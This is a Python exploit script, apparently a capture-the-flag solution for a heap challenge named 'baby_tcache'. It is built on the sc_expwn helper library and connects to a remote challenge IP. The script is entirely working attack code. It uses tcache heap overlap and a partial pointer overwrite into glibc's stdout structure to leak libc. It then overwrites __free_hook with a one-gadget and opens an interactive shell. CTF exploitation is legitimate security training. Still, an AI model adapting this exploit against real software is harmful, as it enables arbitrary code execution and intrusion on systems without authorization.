#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './baby_tcache'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'52.68.236.186', 'port':56746})
env.select()

#==========

binf = ELF(bin_file)

#libc = ELF(env.libc) if env.libc else binf.libc
libc = binf.libc
offset_libc_stdout      = libc.symbols['_IO_2_1_stdout_']
offset_libc_stdin       = libc.symbols['_IO_2_1_stdin_']
offset_libc_onegadget   = 0x4f322

#==========

def attack(conn):
    bt = BabyTcache(conn)

    bt.new(0x410, 'aaaa')   # 0
    bt.new(0x30,  'bbbb')   # 1
    bt.new(0x10,  'cccc')   # 2
    bt.new(0x4f0, 'dddd')   # 3

    bt.delete(2)
    bt.new(0x18,  'c'*0x10+p64(0x480))  # 2

    bt.delete(0)
    bt.delete(3)

    bt.delete(1)
    bt.delete(2)

    bt.new(0x410, 'AAAA')   # 0
    bt.new(0x410, 'BBBB')   # 1
    bt.new(0x20,  'CCCC')   # 2

    bt.delete(1)

    bt.new(0x410,  p64(offset_libc_stdout+0x5000)[:2])  # 1
    #bt.new(0x410,  '\x60\x07\xdd')                      # 1

    bt.new(0x30,  p64(0xdeadbeef))                      # 3
    bt.new(0x30,  p64(0xfbad3887)+p64(0)*3+'\x20')      # 4

    addr_libc_stdin     = u64(conn.recv(8))
    libc.address = addr_libc_stdin - (offset_libc_stdin-0x280)
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_onegadget = libc.address + offset_libc_onegadget

    bt.delete(1)
    bt.new(0x410,  'a'*0x40+p64(addr_libc_free_hook))   # 1
    bt.new(0x10,  p64(0xdeadbeef))                      # 5
    bt.new(0x10,  p64(addr_libc_onegadget))             # 6

    bt.delete(0)

class BabyTcache:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, size, data):
        self.sendlineafter('choice: ', '1')
        self.sendlineafter('Size:', str(size))
        self.sendafter('Data:', data)

    def delete(self, index):
        self.sendlineafter('choice: ', '2')
        self.sendlineafter('Index:', str(index))

#==========

if __name__=='__main__':
    while True:
        conn = communicate(env.mode, **env.target)
        try:
            attack(conn)
        except:
            conn.close()
        else:
            break
    conn.interactive()
    
#==========
